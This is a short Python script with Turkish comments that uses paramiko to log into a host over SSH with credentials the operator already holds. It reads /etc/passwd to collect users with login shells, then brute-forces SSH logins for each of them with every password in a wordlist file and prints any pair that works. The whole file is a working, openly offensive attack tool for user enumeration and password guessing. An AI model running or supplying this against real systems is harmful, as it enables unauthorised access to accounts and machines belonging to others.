import paramiko

ssh = paramiko.SSHClient()

ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

ip = input("enter ip")
port = 22
username = input("enter user name")#elimizde olan kullanıcı adı
password = input("enter password")#elimizde olan şifre

ssh.connect(ip,port=port,username=username,password=password)

command ='cat /etc/passwd'#bir command çalıştırmak için
stdin, stdout,stderr = ssh.exec_command(command)
cmd_output= stdout.read()
ssh.close()

etcpasswd = cmd_output.decode().split("\n")
user_list = []
for ep in etcpasswd:
    if "/bin/bash" in ep or "/bin/sh" in ep:#dosyanın son kısmında işe yarayanları almalıyız
        user = ep.split(":")[0]
        user_list.append(user)
print(user_list)

with open("password.txt", "r") as f:
    passwordss = f.readlines()  # Tüm şifreleri bir listeye al

for user in user_list:
    for passwords in passwordss:
        print(user,":",passwords.strip())
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(ip, username=user, password=passwords.strip(),timeout=0.1,banner_timeout=0.1)
            print("bağlantı kuruldu kullanıcı adı:",user," password:",passwords.strip())
            break
        except Exception as e:
            print(f"Başka bir hata oluştu: {e}")
        finally:
            ssh.close()
